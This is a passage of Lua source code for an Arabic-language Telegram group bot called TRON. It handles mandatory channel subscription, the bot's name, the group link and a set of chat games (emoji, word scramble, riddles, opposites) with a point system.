local GETNUM = DevAbd:get(TRON.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbd:del(TRON.."SET:GAME"..msg.chat_id_)   
Dev_Abd( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbd:del(TRON.."SET:GAME"..msg.chat_id_)   
Dev_Abd( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevAbd:get(TRON..'DevAbd4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⌁︙تم الغاء الامر")
DevAbd:del(TRON..'DevAbd4'..msg.sender_user_id_)
return false  end 
DevAbd:del(TRON..'DevAbd4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '⌁︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '⌁︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '⌁︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'⌁︙البوت ادمن في القناة \n⌁︙تم تفعيل الاشتراك الاجباري \n⌁︙ايدي القناة ↫ '..data.id_..'\n⌁︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevAbd:set(TRON..'Abd:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'⌁︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source TRON     --
if DevAbd:get(TRON.."Abd:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevAbd:del(TRON.."Abd:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
return false 
end 
DevAbd:del(TRON.."Abd:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbd:set(TRON.."DevText", DevText)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
end
if DevAbd:get(TRON..'Abd:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevAbd:del(TRON..'Abd:NameBot'..msg.sender_user_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
DevAbd:del(TRON..'Abd:NameBot'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:NameBot', text)
return false 
end
--     Source TRON     --
if text == "الرابط" then
if not DevAbd:get(TRON.."Abd:Lock:GpLinks"..msg.chat_id_) then 
if DevAbd:get(TRON.."Abd:Groups:Links"..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevAbd:get(TRON.."Abd:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙جلب رابط المجموعه معطل', 1, 'md')
end
end
--     Source TRON     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevAbd:get(TRON..'Abd:NameBot') or 'ترون')
local TRONTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM[math.random(#TRONTEAM)] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevAbd:get(TRON..'Abd:NameBot') or 'ترون') 
local TRONTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM[math.random(#TRONTEAM)] , 1, 'html') 
return false
end
if text and text == (DevAbd:get(TRON..'Abd:NameBot') or 'ترون') then 
NameBot = (DevAbd:get(TRON..'Abd:NameBot') or 'ترون')
local TRONTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM[math.random(#TRONTEAM)] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAbd:del(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevAbd:del(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
--     Source TRON     --
if text == 'سمايلات' and SourceCh(msg) or text == 'السمايلات' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
TRONTEAM = '⌁︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and SourceCh(msg) or text == 'الترتيب' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
TRONTEAM = '⌁︙اول واحد يرتبها يربح ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and SourceCh(msg) or text == 'بات' and SourceCh(msg) or text == 'المحيبس' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevAbd:set(TRON.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

⌁︙اختر رقم لاستخراج المحيبس
⌁︙الفائز يحصل على (5) نقاط
]]
Dev_Abd(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbd:setex(TRON.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and SourceCh(msg) or text == 'الحزوره' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
TRONTEAM = '⌁︙اول واحد يحلها يربح ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ حزوره للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and SourceCh(msg) or text == 'معاني' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum2'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
TRONTEAM = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum2'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المعاني للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and SourceCh(msg) or text == 'عكس' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum3'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
TRONTEAM = '⌁︙ما هو عكس كلمة ↫ '..name
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
return false
end end
if text == DevAbd:get(TRON..'Abd:GameNum3'..msg.chat_id_) and not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Games:Ids'..msg.chat_id_) then 
TRONTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ العكس للعب مره اخرى'
Dev_Abd(msg.chat_id_, msg.id_, 1,TRONTEAM, 1, 'md')
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbd:set(TRON..'Abd:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and SourceCh(msg) or text == 'مختلف' and SourceCh(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Games'..msg.chat_id_) then
DevAbd2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevAbd2[math.random(#DevAbd2)]
DevAbd:set(TRON..'Abd:GameNum4'..msg.chat_id_,name)
DevAbd:del(TRON..'Abd:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
